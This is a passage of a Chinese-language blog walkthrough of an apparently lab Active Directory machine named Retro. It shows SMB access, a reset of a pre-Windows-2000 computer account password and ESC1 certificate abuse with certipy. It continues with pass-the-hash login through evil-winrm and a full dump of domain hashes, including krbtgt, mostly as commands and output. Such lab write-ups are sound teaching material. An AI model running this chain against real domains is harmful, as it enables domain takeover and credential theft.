<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ smbclient //<span class="variable">$IP</span>/Notes -U trainee</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\trainee]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Wed Apr  9 03:12:49 2025</span><br><span class="line">  ..                                DHS        0  Wed Jun 11 14:17:10 2025</span><br><span class="line">  ToDo.txt                            A      248  Sun Jul 23 22:05:56 2023</span><br><span class="line">  user.txt                            A       32  Wed Apr  9 03:13:01 2025</span><br><span class="line"></span><br><span class="line">                4659711 blocks of size 4096. 1280227 blocks available</span><br><span class="line">smb: \&gt; prompt</span><br></pre></td></tr></table></figure>

<p>下载下来看看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">─$ <span class="built_in">cat</span> ToDo.txt </span><br><span class="line">Thomas,</span><br><span class="line"></span><br><span class="line">after convincing the finance department to get rid of their ancienct banking software</span><br><span class="line">it is finally <span class="keyword">time</span> to clean up the mess they made. We should start with the pre created</span><br><span class="line">computer account. That one is older than me.</span><br><span class="line"></span><br><span class="line">Best</span><br><span class="line"></span><br><span class="line">James</span><br><span class="line"></span><br><span class="line">Thomas，</span><br><span class="line"></span><br><span class="line">在说服财务部门淘汰他们过时的银行软件后，</span><br><span class="line">终于到了清理他们造成的混乱的时候了。我们应该从预先创建的</span><br><span class="line">电脑账户开始。那个账户比我还老。</span><br><span class="line"></span><br><span class="line">祝好</span><br><span class="line"></span><br><span class="line">James</span><br></pre></td></tr></table></figure>

<p>他说<code>银行软件</code>,<code>那个账户老</code><br>回到上面有一个<code>BANKING$</code>的账户，他说<code>pre created computer account</code>，其实有点想到之前吧唧做过的<code>pre-windows</code>，google一下</p>
<p><a data-fancybox="gallery" data-src="/images/retro-1.png" data-caption=""><img src="/images/retro-1.png"></a></p>
<p>应该就是这个，在<a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers">pre-windows 2000 computers</a>这个文章当中提到了</p>
<blockquote>
<p>When a new computer account is configured as “pre-Windows 2000 computer”, its password is set based on its name (i.e. lowercase computer name without the trailing $). When it isn’t, the password is randomly generated.</p>
</blockquote>
<p>这不就刚好符合了<code>BANKING$</code>这个角色了<br>smbclient试一下账户密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ smbclient //<span class="variable">$IP</span>/Notes -U <span class="string">&#x27;BANKING$&#x27;</span>            </span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\BANKING$]:</span><br><span class="line">session setup failed: NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</span><br></pre></td></tr></table></figure>

<p>根据文章中提到的<a target="_blank" rel="noopener" href="https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts">TrustedSec’s blogpost</a>的方法，我们可以改一下<code>BANKING$</code>的密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我这里用的是changepasswd,走的是rpc</span></span><br><span class="line">└─$ changepasswd.py -newpass <span class="string">&#x27;password@123&#x27;</span> -p rpc-samr -dc-ip <span class="variable">$IP</span> retro.vl/BANKING\$:<span class="string">&#x27;banking&#x27;</span>@<span class="variable">$IP</span></span><br><span class="line">/home/wansh/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span class="keyword">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.</span><br><span class="line">  import pkg_resources</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Changing the password of retro.vl\BANKING$</span><br><span class="line">[*] Connecting to DCE/RPC as retro.vl\BANKING$</span><br><span class="line">[*] Password was changed successfully.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试一下</span></span><br><span class="line">└─$ nxc smb <span class="variable">$IP</span> -u BANKING\$ -p password@123 </span><br><span class="line">SMB         10.129.201.124  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.201.124  445    DC               [+] retro.vl\BANKING$:password@123 </span><br></pre></td></tr></table></figure>

<p>ok，修改成功了</p>
<h2 id="shell-as-BANKING"><a href="#shell-as-BANKING" class="headerlink" title="shell as BANKING$"></a>shell as BANKING$</h2><h3 id="ESC1"><a href="#ESC1" class="headerlink" title="ESC1"></a>ESC1</h3><p>看一下证书</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">└─$ certipy find -vulnerable -dc-ip <span class="variable">$IP</span> -target-ip <span class="variable">$IP</span> -u BANKING\$ -p password@123 </span><br><span class="line">Certipy v5.0.3 - by Oliver Lyak (ly4k)                                                                                        </span><br><span class="line">                                                               </span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 34 certificate templates                                                                                            </span><br><span class="line">[*] Finding certificate authorities                                                                                           </span><br><span class="line">[*] Found 1 certificate authority                                                                                             </span><br><span class="line">[*] Found 12 enabled certificate templates</span><br><span class="line">[*] Finding issuance policies                                                                                                 </span><br><span class="line">[*] Found 15 issuance policies                                                                                                </span><br><span class="line">[*] Found 0 OIDs linked to templates                                                                                          </span><br><span class="line">[*] Retrieving CA configuration <span class="keyword">for</span> <span class="string">&#x27;retro-DC-CA&#x27;</span> via RRP                                                                     </span><br><span class="line">[-] Failed to connect to remote registry: No answer!                                                                          </span><br><span class="line">[-] Use -debug to <span class="built_in">print</span> a stacktrace                                                                                          </span><br><span class="line">[!] Failed to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;retro-DC-CA&#x27;</span> via RRP: <span class="string">&#x27;NoneType&#x27;</span> object has no attribute <span class="string">&#x27;request&#x27;</span></span><br><span class="line">[!] Use -debug to <span class="built_in">print</span> a stacktrace                                                                                          </span><br><span class="line">[!] Could not retrieve configuration <span class="keyword">for</span> <span class="string">&#x27;retro-DC-CA&#x27;</span>                                                                        </span><br><span class="line">[*] Checking web enrollment <span class="keyword">for</span> CA <span class="string">&#x27;retro-DC-CA&#x27;</span> @ <span class="string">&#x27;DC.retro.vl&#x27;</span>    </span><br><span class="line">[!] Error checking web enrollment: Server disconnected without sending a response.</span><br><span class="line">[!] Use -debug to <span class="built_in">print</span> a stacktrace</span><br><span class="line">[!] Error checking web enrollment: [SSL: UNEXPECTED_EOF_WHILE_READING] EOF occurred <span class="keyword">in</span> violation of protocol (_ssl.c:1029)</span><br><span class="line">[!] Use -debug to <span class="built_in">print</span> a stacktrace</span><br><span class="line">[*] Saving text output to <span class="string">&#x27;20250627084616_Certipy.txt&#x27;</span></span><br><span class="line">[*] Wrote text output to <span class="string">&#x27;20250627084616_Certipy.txt&#x27;</span></span><br><span class="line">[*] Saving JSON output to <span class="string">&#x27;20250627084616_Certipy.json&#x27;</span></span><br><span class="line">[*] Wrote JSON output to <span class="string">&#x27;20250627084616_Certipy.json&#x27;</span></span><br></pre></td></tr></table></figure>

<p>看一下洞洞<br><a data-fancybox="gallery" data-src="/images/retro-2.png" data-caption=""><img src="/images/retro-2.png"></a></p>
<p>有一个ESC1的，利用一下（具体利用方式可以参考<a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation">certipy的文档</a>)<br>先找一下目标账户也就是administrator的UPN和SID</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ certipy account -u BANKING\$ -p <span class="string">&#x27;password@123&#x27;</span> -dc-ip <span class="variable">$IP</span> -user <span class="string">&#x27;administrator&#x27;</span> <span class="built_in">read</span></span><br><span class="line">Certipy v5.0.3 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Reading attributes <span class="keyword">for</span> <span class="string">&#x27;Administrator&#x27;</span>:</span><br><span class="line">    cn                                  : Administrator</span><br><span class="line">    distinguishedName                   : CN=Administrator,CN=Users,DC=retro,DC=vl</span><br><span class="line">    name                                : Administrator</span><br><span class="line">    objectSid                           : S-1-5-21-2983547755-698260136-4283918172-500</span><br><span class="line">    sAMAccountName                      : Administrator</span><br><span class="line">    userAccountControl                  : 66048</span><br><span class="line">    whenCreated                         : 2023-07-23T21:07:55+00:00</span><br><span class="line">    whenChanged                         : 2025-05-05T07:11:09+00:00</span><br></pre></td></tr></table></figure>

<p>利用一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─$ certipy req \</span><br><span class="line">  -u BANKING\<span class="variable">$@retro</span>.vl -p <span class="string">&#x27;password@123&#x27;</span> \ </span><br><span class="line">  -dc-ip 10.129.201.124 \</span><br><span class="line">  -target 10.129.201.124 \</span><br><span class="line">  -ca <span class="string">&#x27;retro-DC-CA&#x27;</span> \</span><br><span class="line">  -template <span class="string">&#x27;RetroClients&#x27;</span> \</span><br><span class="line">  -upn <span class="string">&#x27;administrator@retro.vl&#x27;</span> \</span><br><span class="line">  -sid <span class="string">&#x27;S-1-5-21-2983547755-698260136-4283918172-500&#x27;</span></span><br><span class="line">Certipy v5.0.3 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Request ID is 15</span><br><span class="line">[-] Got error <span class="keyword">while</span> requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.</span><br><span class="line">Would you like to save the private key? (y/N): y</span><br><span class="line">[*] Saving private key to <span class="string">&#x27;15.key&#x27;</span></span><br><span class="line">[*] Wrote private key to <span class="string">&#x27;15.key&#x27;</span></span><br><span class="line">[-] Failed to request certificate</span><br></pre></td></tr></table></figure>

<p>报错，说长度不对，哪不对，我十八厘米*********</p>
<p>修改一下key-size</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">└─$ certipy req \</span><br><span class="line">  -u BANKING\<span class="variable">$@retro</span>.vl -p <span class="string">&#x27;password@123&#x27;</span> \</span><br><span class="line">  -dc-ip 10.129.201.124 \</span><br><span class="line">  -target 10.129.201.124 \</span><br><span class="line">  -ca <span class="string">&#x27;retro-DC-CA&#x27;</span> \</span><br><span class="line">  -template <span class="string">&#x27;RetroClients&#x27;</span> \</span><br><span class="line">  -upn <span class="string">&#x27;administrator@retro.vl&#x27;</span> \</span><br><span class="line">  -sid <span class="string">&#x27;S-1-5-21-2983547755-698260136-4283918172-500&#x27;</span> \</span><br><span class="line">  -key-size 4096</span><br><span class="line">Certipy v5.0.3 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Request ID is 19</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;administrator@retro.vl&#x27;</span></span><br><span class="line">[*] Certificate object SID is <span class="string">&#x27;S-1-5-21-2983547755-698260136-4283918172-500&#x27;</span></span><br><span class="line">[*] Saving certificate and private key to <span class="string">&#x27;administrator.pfx&#x27;</span></span><br><span class="line">[*] Wrote certificate and private key to <span class="string">&#x27;administrator.pfx&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>请求超时就多求他几次</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ certipy auth -pfx administrator.pfx -dc-ip <span class="variable">$IP</span></span><br><span class="line">Certipy v5.0.3 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Certificate identities:</span><br><span class="line">[*]     SAN UPN: <span class="string">&#x27;administrator@retro.vl&#x27;</span></span><br><span class="line">[*]     SAN URL SID: <span class="string">&#x27;S-1-5-21-2983547755-698260136-4283918172-500&#x27;</span></span><br><span class="line">[*]     Security Extension SID: <span class="string">&#x27;S-1-5-21-2983547755-698260136-4283918172-500&#x27;</span></span><br><span class="line">[*] Using principal: <span class="string">&#x27;administrator@retro.vl&#x27;</span></span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saving credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Wrote credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator@retro.vl&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389</span><br></pre></td></tr></table></figure>

<p>ok，got root</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">└─$ evil-winrm -i <span class="variable">$IP</span> -u administrator -H <span class="string">&#x27;252fac7066d93dd009d4fd2cd0368389&#x27;</span>                                 </span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc<span class="string">&#x27; for module Reline</span></span><br><span class="line"><span class="string">                                        </span></span><br><span class="line"><span class="string">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span></span><br><span class="line"><span class="string">                                        </span></span><br><span class="line"><span class="string">Info: Establishing connection to remote endpoint</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\Administrator&gt; cd desktop</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; dir</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Directory: C:\Users\Administrator\desktop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Mode                 LastWriteTime         Length Name</span></span><br><span class="line"><span class="string">----                 -------------         ------ ----</span></span><br><span class="line"><span class="string">-a----          4/8/2025   8:11 PM             32 root.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; type root.txt</span></span><br><span class="line"><span class="string">40fce9c3f09024bcab29d377ee1ed071</span></span><br></pre></td></tr></table></figure>

<h2 id="shell-as-root"><a href="#shell-as-root" class="headerlink" title="shell as root"></a>shell as root</h2><h3 id="hashes"><a href="#hashes" class="headerlink" title="hashes"></a>hashes</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0xd5c69b965ec7d89a8d5762c2846bcb0c</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash) </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[-] SAM hashes extraction <span class="keyword">for</span> user WDAGUtilityAccount failed. The account doesn<span class="string">&#x27;t have hash information.</span></span><br><span class="line"><span class="string">[*] Dumping cached domain logon information (domain/username:hash)</span></span><br><span class="line"><span class="string">[*] Dumping LSA Secrets</span></span><br><span class="line"><span class="string">[*] $MACHINE.ACC </span></span><br><span class="line"><span class="string">RETRO\DC$:aes256-cts-hmac-sha1-96:73dc84137514a07e9da9c8bf646e3c0467ebd7cafb87ebe126d9fc0596e5933e</span></span><br><span class="line"><span class="string">RETRO\DC$:aes128-cts-hmac-sha1-96:0da333ad84aa081730bd56afa95e5195</span></span><br><span class="line"><span class="string">RETRO\DC$:des-cbc-md5:57d683cdad2f6eab</span></span><br><span class="line"><span class="string">RETRO\DC$:plain_password_hex:78ed8c493abf1caf51adec2048ca2005d9f616ad7ba472659beb0a19eda852e8d697aa014cdaf75654e6c18b1197629fe49c0cd9a4a0ca2914514fb53e31196f07a68d12703a5fd86d3113cef29a14492c883d392cbbe97111097</span></span><br><span class="line"><span class="string">576c7a7abf633dfd53e4af6d7595954abd5fd259c67678dcc06a4a2e25210c657a00ec0ea315798a88d9083c0ba9910e3f58dbf42a23cf16e7297954eb31bc99356acee62683f45389fbd4b2b53ae7ee9b84cea4d5e14c65e0f56226455117712f62d34886e9b2d39c</span></span><br><span class="line"><span class="string">c154b6f2c0e47bf4afc7f2f779a718eb29f1665789975f3d5a61ae2cb970a94607cda6f5baf737b6cb3cd3497</span></span><br><span class="line"><span class="string">RETRO\DC$:aad3b435b51404eeaad3b435b51404ee:12c876af4deb1aedf56306edde6530b3:::</span></span><br><span class="line"><span class="string">[*] DPAPI_SYSTEM </span></span><br><span class="line"><span class="string">dpapi_machinekey:0x1a91aeabc5e9e6ee791b7bc2e9561cea87ef7894</span></span><br><span class="line"><span class="string">dpapi_userkey:0x41514bfd3fd38746c223d69c962f4d98716c8fdc</span></span><br><span class="line"><span class="string">[*] NL$KM </span></span><br><span class="line"><span class="string"> 0000   22 79 68 4A 15 1B F7 0F  2F B0 11 73 81 EA 70 8A   &quot;yhJ..../..s..p.</span></span><br><span class="line"><span class="string"> 0010   04 FC 30 D1 D1 DE A1 30  BC FA 5D CE 83 0A 43 12   ..0....0..]...C.</span></span><br><span class="line"><span class="string"> 0020   97 33 54 4B DA 4D FE 47  B1 8C 87 C1 72 22 E9 36   .3TK.M.G....r&quot;.6</span></span><br><span class="line"><span class="string"> 0030   8E 8D 4C 1E 3E F6 C8 00  A1 23 9F 3A D5 0A 41 B0   ..L.&gt;....#.:..A.</span></span><br><span class="line"><span class="string">NL$KM:2279684a151bf70f2fb0117381ea708a04fc30d1d1dea130bcfa5dce830a43129733544bda4dfe47b18c87c17222e9368e8d4c1e3ef6c800a1239f3ad50a41b0</span></span><br><span class="line"><span class="string">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span></span><br><span class="line"><span class="string">[*] Using the DRSUAPI method to get NTDS.DIT secrets </span></span><br><span class="line"><span class="string">Administrator:500:aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389:::</span></span><br><span class="line"><span class="string">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span><br><span class="line"><span class="string">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e11fffd0ed83eedde12611fc2fbb8650:::</span></span><br><span class="line"><span class="string">retro.vl\trainee:1104:aad3b435b51404eeaad3b435b51404ee:2a217a32bde94a23b26a8eea26c70874:::</span></span><br><span class="line"><span class="string">retro.vl\jburley:1107:aad3b435b51404eeaad3b435b51404ee:38a7c1cf54d326ae1198a25067318b10:::</span></span><br><span class="line"><span class="string">retro.vl\tblack:1109:aad3b435b51404eeaad3b435b51404ee:0adf9f3819565a0d0f3890290ecc3919:::</span></span><br><span class="line"><span class="string">DC$:1000:aad3b435b51404eeaad3b435b51404ee:12c876af4deb1aedf56306edde6530b3:::</span></span><br><span class="line"><span class="string">BANKING$:1106:aad3b435b51404eeaad3b435b51404ee:6de00c52dbabb0e95c074e3006fcf36e:::</span></span><br><span class="line"><span class="string">[*] Kerberos keys grabbed</span></span><br><span class="line"><span class="string">Administrator:aes256-cts-hmac-sha1-96:91aedadb959890d0c47c73a0f462bcb9775c52de2147520748517f091d016aec</span></span><br><span class="line"><span class="string">Administrator:aes128-cts-hmac-sha1-96:dc12711ef29dce1e858846241c62d6b8</span></span><br><span class="line"><span class="string">Administrator:des-cbc-md5:62d575800229e991</span></span><br><span class="line"><span class="string">krbtgt:aes256-cts-hmac-sha1-96:7dc8d6308f224bda9f408203848a87ba7cc483299e8af1089295bfafdf9091b4</span></span><br><span class="line"><span class="string">krbtgt:aes128-cts-hmac-sha1-96:e08f92a73b979e18cd92bfd01384d17f</span></span><br><span class="line"><span class="string">krbtgt:des-cbc-md5:04f8ba042a0d0b34</span></span><br><span class="line"><span class="string">retro.vl\trainee:aes256-cts-hmac-sha1-96:e462ff9c3e807665fb64fb8d3d04bfb5ca82e10374c7f68c03dfaa4d8fd754de </span></span><br><span class="line"><span class="string">retro.vl\trainee:aes128-cts-hmac-sha1-96:48d6b2f2502bb0b6c6079b5d4f566e62</span></span><br><span class="line"><span class="string">retro.vl\trainee:des-cbc-md5:529d4ae0cbcea249</span></span><br><span class="line"><span class="string">retro.vl\jburley:aes256-cts-hmac-sha1-96:931a7941a2eccb21a44b8882dbe7fe55eb3d1af71eed3281f340d49307f538f6 </span></span><br><span class="line"><span class="string">retro.vl\jburley:aes128-cts-hmac-sha1-96:297f2b94f22d44a3f5279d942e8503a0</span></span><br><span class="line"><span class="string">retro.vl\jburley:des-cbc-md5:ef4fb9451f64eada</span></span><br><span class="line"><span class="string">retro.vl\tblack:aes256-cts-hmac-sha1-96:186354f19e5a23e4a6f2a6726d91e834327cf5f673bc8581f4df0fd65919ecf3</span></span><br><span class="line"><span class="string">retro.vl\tblack:aes128-cts-hmac-sha1-96:dec95a15b87f9b91e23d24e5b232eda4</span></span><br><span class="line"><span class="string">retro.vl\tblack:des-cbc-md5:2cf23101436bda4f</span></span><br><span class="line"><span class="string">DC$:aes256-cts-hmac-sha1-96:73dc84137514a07e9da9c8bf646e3c0467ebd7cafb87ebe126d9fc0596e5933e</span></span><br><span class="line"><span class="string">DC$:aes128-cts-hmac-sha1-96:0da333ad84aa081730bd56afa95e5195</span></span><br><span class="line"><span class="string">DC$:des-cbc-md5:855b5ea15261f762</span></span><br><span class="line"><span class="string">BANKING$:aes256-cts-hmac-sha1-96:3914ed00aa7b820a8c7e3d366a50946103c140149654e1b92d7cc937a3f209dd</span></span><br><span class="line"><span class="string">BANKING$:aes128-cts-hmac-sha1-96:7617c7194acd32c02c899d2a9e219438</span></span><br><span class="line"><span class="string">BANKING$:des-cbc-md5:b97adc7fe53149e5</span></span><br><span class="line"><span class="string">[*] Cleaning up... </span></span><br><span class="line"><span class="string">[*] Stopping service RemoteRegistry</span></span><br><span class="line"><span class="string">[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.</span></span><br><span class="line"><span class="string">[*] Cleaning up... </span></span><br><span class="line"><span class="string">[*] Stopping service RemoteRegistry</span></span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li>
        
          <li><a href="https://n0nome.github.io/tags/random/">random</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-number">1.</span> <span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#smb-share"><span class="toc-number">1.1.</span> <span class="toc-text">smb share</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Spraying"><span class="toc-number">1.2.</span> <span class="toc-text">Password Spraying</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pre-created-computer-account-passwd-change"><span class="toc-number">1.3.</span> <span class="toc-text">pre created computer account passwd change</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-BANKING"><span class="toc-number">2.</span> <span class="toc-text">shell as BANKING$</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC1"><span class="toc-number">2.1.</span> <span class="toc-text">ESC1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-root"><span class="toc-number">3.</span> <span class="toc-text">shell as root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hashes"><span class="toc-number">3.1.</span> <span class="toc-text">hashes</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
